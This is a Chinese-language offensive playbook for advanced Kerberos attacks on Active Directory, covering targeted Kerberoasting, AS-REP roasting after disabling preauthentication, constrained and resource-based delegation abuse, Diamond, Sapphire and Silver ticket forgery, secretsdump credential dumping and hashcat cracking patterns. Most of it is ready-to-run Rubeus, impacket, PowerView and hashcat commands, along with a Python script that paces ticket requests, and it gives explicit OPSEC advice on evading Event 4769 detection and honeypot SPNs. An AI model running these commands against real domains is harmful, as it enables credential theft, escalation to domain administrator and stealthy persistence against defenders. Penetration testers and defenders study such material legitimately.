# 高级 Kerberoasting 与防御绕过

> 超越基础 Kerberoasting: Targeted 攻击、OPSEC 优化、委派滥用、高级票据伪造

---

## 一、Targeted Kerberoasting

### 1.1 仅请求高价值 SPN

```
策略: 不全量枚举 → 只请求高价值目标的 TGS

高价值目标识别:
├─ adminCount=1 → 曾经是高权限组成员
├─ memberOf 包含 Domain Admins / Enterprise Admins
├─ 账户名含 admin/svc/sql/backup/exchange
├─ BloodHound 攻击路径上的关键节点
└─ 密码最后设置时间较久（可能是弱密码）
```

```bash
# 精准 LDAP 查询 — 只找高价值 SPN 账户
ldapsearch -H ldap://DC_IP -D "user@domain.com" -w "pass" \
  -b "DC=domain,DC=com" \
  "(&(objectClass=user)(servicePrincipalName=*)(adminCount=1))" \
  sAMAccountName servicePrincipalName memberOf pwdLastSet

# impacket — 只请求特定账户的 TGS
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP \
  -request -target-user svc_sql_admin -outputfile targeted_hash.txt

# Rubeus — 指定账户
Rubeus.exe kerberoast /user:svc_sql_admin /outfile:hash.txt

# BloodHound 查询高价值 SPN
# Cypher:
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ '.*ADMIN.*'
RETURN u.name, u.serviceprincipalnames
```

### 1.2 避免大量 TGS 请求触发检测

```
OPSEC 原则:
├─ ⛔ 不要一次请求所有 SPN 的票据
│   → 几分钟内大量 4769 事件 → 告警
│
├─ ✓ 分批请求，间隔 30-60 秒
│   → 模拟正常服务访问模式
│
├─ ✓ 使用 AES 而非 RC4
│   → RC4 降级是 Kerberoasting 特征
│   → AES 请求看起来更正常
│
├─ ✓ 在业务时间操作
│   → 凌晨 3 点的 TGS 请求更可疑
│
└─ ✓ 使用多个不同的源账户请求
    → 避免单个账户产生大量 TGS 请求
```

```python
#!/usr/bin/env python3
"""OPSEC-aware Kerberoasting — 分批延迟请求"""
import subprocess
import time
import random

targets = [
    'svc_sql_admin',
    'svc_exchange',
    'svc_backup',
]

for target in targets:
    print(f"[*] Requesting TGS for: {target}")
    cmd = [
        'impacket-GetUserSPNs',
        'DOMAIN/user:pass',
        '-dc-ip', 'DC_IP',
        '-request',
        '-target-user', target,
        '-outputfile', f'{target}_hash.txt'
    ]
    subprocess.run(cmd, capture_output=True)

    # 随机延迟 30-90 秒
    delay = random.randint(30, 90)
    print(f"    Sleeping {delay}s...")
    time.sleep(delay)
```

---

## 二、AS-REP Roasting 深入

### 2.1 发现无预认证账户

```bash
# 方法 1: LDAP 查询（需要域凭据）
ldapsearch -H ldap://DC_IP -D "user@domain.com" -w "pass" \
  -b "DC=domain,DC=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# UAC 标志 4194304 = DONT_REQUIRE_PREAUTH

# 方法 2: impacket（无需凭据 + 用户名列表）
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP \
  -usersfile users.txt -format hashcat -outputfile asrep.txt

# 方法 3: netexec（需要凭据）
netexec ldap DC_IP -u user -p pass --asreproast asrep.txt

# 方法 4: PowerView（域内）
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

### 2.2 GenericWrite → 禁用预认证 → AS-REP Roast

```
攻击链:
1. 发现对目标用户有 GenericWrite 权限
2. 修改目标用户的 userAccountControl → 添加 DONT_REQUIRE_PREAUTH
3. 执行 AS-REP Roasting → 获取哈希
4. 恢复原始 UAC 值（OPSEC）
5. 离线破解哈希
```

```bash
# Step 1: 确认 GenericWrite 权限（BloodHound 或 PowerView）
# BloodHound: 查看 GenericWrite/GenericAll 边

# Step 2: 禁用预认证
# PowerView:
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304}

# impacket-dacledit / bloodyAD:
bloodyAD -d DOMAIN -u attacker -p pass --host DC_IP set object target_user \
  userAccountControl 4194304

# Step 3: AS-REP Roast
impacket-GetNPUsers DOMAIN/target_user -dc-ip DC_IP \
  -no-pass -format hashcat -outputfile asrep_target.txt

# Step 4: 恢复原始 UAC（重要 OPSEC 步骤）
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304}
# 或
bloodyAD -d DOMAIN -u attacker -p pass --host DC_IP set object target_user \
  userAccountControl 0  # 恢复为原值

# Step 5: 离线破解
hashcat -m 18200 asrep_target.txt wordlist.txt -r best64.rule -O -w 3
```

---

## 三、Kerberoasting 变体

### 3.1 Constrained Delegation Abuse (S4U2Self + S4U2Proxy)

```
Constrained Delegation:
├─ 允许服务代表用户访问特定服务
├─ S4U2Self: 服务为自己获取任意用户的 ST（针对自身服务）
├─ S4U2Proxy: 使用 S4U2Self 的 ST 请求目标服务的 ST
├─ 如果控制了配置了 Constrained Delegation 的账户
│   → 可以冒充任意用户访问允许的目标服务
└─ 包括冒充 Domain Admin 访问域控

发现:
├─ BloodHound: 查看 AllowedToDelegate 边
├─ LDAP: (&(objectClass=user)(msds-allowedtodelegateto=*))
└─ PowerView: Get-DomainUser -TrustedToAuth
```

```bash
# impacket — S4U2Self + S4U2Proxy
# 冒充 Administrator 访问 cifs/DC
impacket-getST DOMAIN/svc_account:pass -dc-ip DC_IP \
  -spn cifs/dc01.domain.com \
  -impersonate Administrator

# 使用获取的票据
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass dc01.domain.com

# Rubeus
Rubeus.exe s4u /user:svc_account /rc4:HASH \
  /impersonateuser:Administrator \
  /msdsspn:cifs/dc01.domain.com /ptt
```

### 3.2 Resource-Based Constrained Delegation (RBCD)

```
RBCD 攻击:
├─ 条件: 对目标机器有 GenericWrite 权限
├─ 步骤:
│   1. 创建（或控制）一个机器账户
│   2. 修改目标机器的 msDS-AllowedToActOnBehalfOfOtherIdentity
│      → 添加攻击者控制的机器账户
│   3. 使用 S4U2Self + S4U2Proxy 获取目标机器的服务票据
│   4. 冒充 Domain Admin 访问目标
└─ 不需要目标配置 Constrained Delegation
```

```bash
# Step 1: 创建机器账户（默认域用户可添加 10 个）
impacket-addcomputer DOMAIN/user:pass -computer-name 'EVILPC$' \
  -computer-pass 'Password123!' -dc-host DC_IP

# Step 2: 修改目标的 RBCD 属性
impacket-rbcd DOMAIN/user:pass -dc-ip DC_IP \
  -action write -delegate-from 'EVILPC$' -delegate-to 'TARGET_SERVER$'

# Step 3: S4U 攻击
impacket-getST DOMAIN/'EVILPC$':'Password123!' -dc-ip DC_IP \
  -spn cifs/target_server.domain.com \
  -impersonate Administrator

# Step 4: 利用
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass target_server.domain.com
```

### 3.3 Diamond Ticket / Sapphire Ticket

```
Diamond Ticket:
├─ 类似 Golden Ticket 但更隐蔽
├─ 原理:
│   1. 获取 krbtgt 的 AES256 密钥
│   2. 正常请求 TGT（产生合法的 4768 事件）
│   3. 使用 krbtgt 密钥解密 TGT
│   4. 修改 PAC 中的权限信息（添加 Domain Admin 等）
│   5. 重新加密 TGT
├─ 与 Golden Ticket 区别:
│   Golden: 完全伪造 → 无 4768 事件 → 异常
│   Diamond: 修改合法 TGT → 有 4768 事件 → 更正常
└─ 检测更困难

Rubeus:
Rubeus.exe diamond /krbkey:AES256_KEY /user:attacker /password:pass \
  /enctype:aes256 /domain:domain.com /dc:dc01.domain.com \
  /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt

Sapphire Ticket:
├─ Diamond Ticket + S4U2Self
├─ 获取合法用户的 PAC → 更真实
├─ 使用 U2U (User-to-User) Kerberos 获取目标用户的 PAC
├─ 将合法 PAC 注入到伪造的 TGT 中
└─ 最隐蔽的 Kerberos 票据攻击

Rubeus:
Rubeus.exe diamond /krbkey:AES256_KEY /user:attacker /password:pass \
  /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 \
  /groups:512 /tgtdeleg /ptt
```

### 3.4 Silver Ticket

```
Silver Ticket:
├─ 伪造特定服务的 Service Ticket (TGS)
├─ 只需要服务账户的 NTLM/AES 密钥（不需要 krbtgt）
├─ 不经过 DC 验证 → 不产生 4769 事件
├─ 但仅对特定服务有效（不如 Golden Ticket 通用）
└─ 用于持久化访问特定服务

常见 Silver Ticket SPN:
├─ CIFS/target → 文件共享访问
├─ HTTP/target → Web 服务
├─ HOST/target → WMI/PsExec/计划任务
├─ MSSQL/target → 数据库访问
├─ LDAP/dc01 → LDAP 查询（DCSync 前提）
└─ KRBTGT/domain → 等效 Golden Ticket
```

```bash
# impacket — Silver Ticket
impacket-ticketer -nthash NTLM_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain domain.com \
  -spn cifs/target.domain.com \
  Administrator

# Rubeus — Silver Ticket
Rubeus.exe silver /service:cifs/target.domain.com \
  /rc4:NTLM_HASH /user:Administrator /id:500 \
  /domain:domain.com /sid:S-1-5-21-XXX /ptt

# 使用
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass target.domain.com
```

---

## 四、OPSEC 注意事项

### 4.1 RC4 vs AES 加密类型

```
加密类型选择:
├─ RC4-HMAC (etype 23)
│   ├─ Kerberoasting: hashcat -m 13100 → 速度快
│   ├─ 但 RC4 TGS 请求在现代域中不正常
│   ├─ 检测规则专门标记 RC4 降级
│   └─ ⛔ 高 OPSEC 风险
│
├─ AES256 (etype 18)
│   ├─ Kerberoasting: hashcat -m 19700 → 速度慢 ~6000x
│   ├─ 在启用 AES 的域中看起来正常
│   ├─ 检测规则通常不标记 AES TGS 请求
│   └─ ✓ 低 OPSEC 风险
│
└─ 策略:
    ├─ 目标无 AES 策略 → 使用 RC4（速度优先）
    ├─ 目标有检测 → 使用 AES（隐蔽优先）
    └─ 折中: 先 AES 请求 → 破解失败 → 再 RC4
```

```bash
# impacket 请求 AES 票据
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP \
  -request -target-user svc_account \
  -outputfile hash_aes.txt

# Rubeus 指定 AES
Rubeus.exe kerberoast /user:svc_account /enctype:aes256 /outfile:hash_aes.txt
```

### 4.2 检测规则详解

```
Event ID 4769 — TGS Request:
├─ Service Name: 请求的 SPN
├─ Ticket Encryption Type:
│   0x17 = RC4-HMAC → Kerberoasting 特征
│   0x12 = AES256 → 正常
│   0x11 = AES128 → 较少见
├─ Client Address: 请求来源 IP
├─ Account Name: 请求者
└─ Failure Code: 0x0 = 成功

检测逻辑:
├─ 短时间内同一账户大量 4769 事件 → Kerberoasting
├─ TicketEncryptionType = 0x17 + 非机器账户请求 → RC4 降级
├─ 蜜罐 SPN: 创建不对应真实服务的 SPN → 请求 = 攻击
└─ 统计基线: 账户平时请求 TGS 次数 vs 当前次数
```

### 4.3 规避策略汇总

```
Kerberoasting OPSEC 清单:
├─ [ ] 使用 AES256 加密类型请求
├─ [ ] 一次只请求 1-3 个高价值 SPN
├─ [ ] 请求间隔 30-90 秒
├─ [ ] 在业务时间操作
├─ [ ] 使用不同源账户（如果有多个）
├─ [ ] 不请求蜜罐 SPN（对比 BloodHound 数据）
├─ [ ] 破解成功后立即使用凭据（减少重新请求）
└─ [ ] 清除本地 Kerberos 票据缓存（klist purge）

AS-REP Roasting OPSEC:
├─ [ ] 确认目标存在 → 再请求（避免大量失败请求）
├─ [ ] GenericWrite 攻击后恢复原始 UAC
└─ [ ] 不要遗留修改的属性
```

---

## 五、Hashcat/John 高级技巧

### 5.1 Rule-based Attacks for Service Accounts

```bash
# 服务账户密码常见模式:
# - 公司名+年份+符号: Company2024!
# - 服务名+数字: SqlServer123
# - 随机但短: P@ssw0rd1

# 生成服务账户专用字典
cat <<'EOF' > svc_base.txt
Service
Password
Welcome
Server
Admin
Database
Backup
Exchange
SQL
Oracle
SAP
EOF

# 配合规则攻击
hashcat -m 13100 hashes.txt svc_base.txt \
  -r /usr/share/hashcat/rules/best64.rule -O -w 3

# 自定义服务账户规则
cat <<'EOF' > svc_rules.rule
c $1 $!
c $@ $1 $2 $3
c $2 $0 $2 $4 $!
c $2 $0 $2 $5 $!
c $2 $0 $2 $6 $!
$S $e $r $v $i $c $e
$P $a $s $s
$A $d $m $i $n
EOF
hashcat -m 13100 hashes.txt svc_base.txt -r svc_rules.rule -O -w 3
```

### 5.2 Mask Attacks with Known Patterns

```bash
# 服务账户常见密码模式

# Pattern: ServiceName + Year + Symbol (e.g., SqlAdmin2024!)
hashcat -m 13100 hashes.txt -a 3 '?u?l?l?l?l?l?l?l?d?d?d?d?s' -O -w 3

# Pattern: Company abbreviation + digits (e.g., CORP1234)
hashcat -m 13100 hashes.txt -a 3 '?u?u?u?u?d?d?d?d' -O -w 3

# Pattern: 已知前缀 + 未知后缀
hashcat -m 13100 hashes.txt -a 3 'Service?d?d?d?d' -O -w 3
hashcat -m 13100 hashes.txt -a 3 'Svc_?l?l?l?l?d?d' -O -w 3

# 混合: 字典 + 数字后缀
hashcat -m 13100 hashes.txt -a 6 svc_base.txt '?d?d?d?d?s' -O -w 3
```

### 5.3 Token Length Correlation

```
TGS 票据中包含加密的服务票据数据。
票据长度可能暗示密码长度/类型:

分析:
├─ 提取所有哈希 → 按长度分组
├─ 较短的哈希可能对应较短的密码
├─ 但 Kerberos 票据长度主要由 PAC 大小决定
├─ 实际相关性有限，但可用于优先级排序

优先级策略:
├─ pwdLastSet 较旧的账户 → 密码可能更弱 → 优先
├─ 描述中包含 "temp" / "test" → 可能弱密码 → 优先
├─ adminCount=1 → 高价值 → 优先
└─ 不在高权限组但有 SPN → 低优先级 → 可跳过
```

---

## 六、工具详细配置

### Rubeus 高级选项

```bash
# Kerberoasting — 完整 OPSEC 配置
Rubeus.exe kerberoast \
  /user:svc_target \
  /enctype:aes256 \
  /domain:domain.com \
  /dc:dc01.domain.com \
  /outfile:C:\Users\Public\hash.txt \
  /nowrap

# AS-REP Roasting
Rubeus.exe asreproast \
  /user:target_user \
  /domain:domain.com \
  /dc:dc01.domain.com \
  /format:hashcat \
  /outfile:asrep.txt

# 请求 TGT（用于后续操作）
Rubeus.exe asktgt \
  /user:svc_account \
  /password:cracked_pass \
  /enctype:aes256 \
  /domain:domain.com \
  /dc:dc01.domain.com \
  /ptt

# S4U 攻击
Rubeus.exe s4u \
  /user:svc_account \
  /aes256:AES_KEY \
  /impersonateuser:Administrator \
  /msdsspn:cifs/target.domain.com \
  /altservice:ldap \
  /ptt
```

### Impacket GetUserSPNs 高级选项

```bash
# 基本 Kerberoasting
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request

# 使用 Kerberos 票据认证（避免明文密码）
impacket-GetUserSPNs DOMAIN/user -k -no-pass -dc-ip DC_IP -request

# 使用 NTLM hash 认证
impacket-GetUserSPNs DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP -request

# 输出特定格式
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP \
  -request -outputfile hashes.txt

# 指定目标用户
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP \
  -request -target-user svc_sql
```

### PowerView 相关命令

```powershell
# 发现所有 Kerberoastable 账户
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, admincount, pwdlastset

# 发现高价值 Kerberoastable 账户
Get-DomainUser -SPN -AdminCount | Select-Object samaccountname, serviceprincipalname

# 发现无预认证账户
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# 设置 SPN（Targeted Kerberoasting 前提）
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='http/fake'}

# 清除 SPN（恢复）
Set-DomainObject -Identity target_user -Clear serviceprincipalname
```

---

## 参考链接

- [HarmJ0y - Kerberoasting Without Mimikatz](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
- [Rubeus - GitHub](https://github.com/GhostPack/Rubeus)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Diamond Ticket - Semperis](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
- [RBCD Attack - Elad Shamir](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
